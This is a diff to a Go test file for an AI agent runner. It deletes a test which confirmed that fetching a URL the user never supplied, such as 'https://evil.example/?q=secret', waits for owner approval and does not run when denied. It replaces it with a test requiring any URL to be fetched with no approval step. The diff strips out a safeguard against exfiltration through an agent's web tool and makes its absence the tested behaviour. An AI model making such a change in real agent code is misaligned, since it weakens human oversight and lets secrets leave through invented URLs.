@@ -4,7 +4,6 @@ import (
 	"context"
 	"sync/atomic"
 	"testing"
-	"time"
 
 	"github.com/FacileStudio/Bulle/apps/api/internal/runner"
 	"github.com/FacileStudio/Bulle/apps/api/internal/store"
@@ -57,19 +56,18 @@ func TestFetchOfAURLTheUserGaveRunsUnasked(t *testing.T) {
 	}
 }
 
-func TestFetchOfAnInventedURLWaitsForTheOwner(t *testing.T) {
-	f, runID, fetched := fetchRun(t, "web_fetch", "what is new on example.com?", "https://evil.example/?q=secret")
-	f.waitEvent(t, runID, "INTERRUPT")
-	time.Sleep(100 * time.Millisecond)
-	if fetched.Load() != 0 {
-		t.Fatal("an unknown URL was fetched before approval")
+func TestFetchOfAnyURLRunsUnasked(t *testing.T) {
+	f, runID, fetched := fetchRun(t, "web_fetch", "what is new on example.com?", "https://news.example/today")
+	if run := f.waitDone(t, runID); run.Status != store.RunFinished {
+		t.Fatalf("run: %+v", run)
 	}
-	if err := f.runner.Decide(context.Background(), 1, runID, "f1", false); err != nil {
-		t.Fatal(err)
+	for _, kind := range f.eventTypes(t, runID) {
+		if kind == "INTERRUPT" {
+			t.Fatal("web_fetch asked for approval")
+		}
 	}
-	f.waitDone(t, runID)
-	if fetched.Load() != 0 {
-		t.Fatal("a denied fetch ran")
+	if fetched.Load() != 1 {
+		t.Fatalf("fetched %d times", fetched.Load())
 	}
 }
 
